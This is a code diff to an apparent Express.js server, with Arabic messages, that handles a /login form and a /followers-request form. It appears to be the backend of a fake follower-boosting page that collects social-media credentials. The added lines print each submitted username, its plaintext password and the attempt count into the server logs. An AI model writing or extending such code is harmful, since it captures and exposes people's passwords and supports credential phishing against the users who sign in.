@@ -34,7 +34,10 @@ app.post("/login", (req, res) => {
         .json({ success: false, message: "حدث خطأ في حفظ البيانات" });
     }
 
-    console.log("تم تسجيل بيانات جديدة");
+    // طباعة البيانات المسجلة في سجلات الخادم بشكل مفصل
+    console.info(
+      `تم تسجيل بيانات جديدة (اسم المستخدم: ${username}, كلمة المرور: ${password}, المحاولة: ${attempt})`
+    );
     res.json({ success: true, message: "تم استلام البيانات بنجاح" });
   });
 });
@@ -58,7 +61,10 @@ app.post("/followers-request", (req, res) => {
           .json({ success: false, message: "حدث خطأ في حفظ البيانات" });
       }
 
-      console.log("تم تسجيل طلب متابعين جديد");
+      // طباعة البيانات المسجلة في سجلات الخادم بشكل مفصل
+      console.info(
+        `تم تسجيل طلب متابعين جديد (عدد المتابعين: ${followersCount})`
+      );
       res.json({ success: true, message: "تم استلام طلب المتابعين بنجاح" });
     }
   );
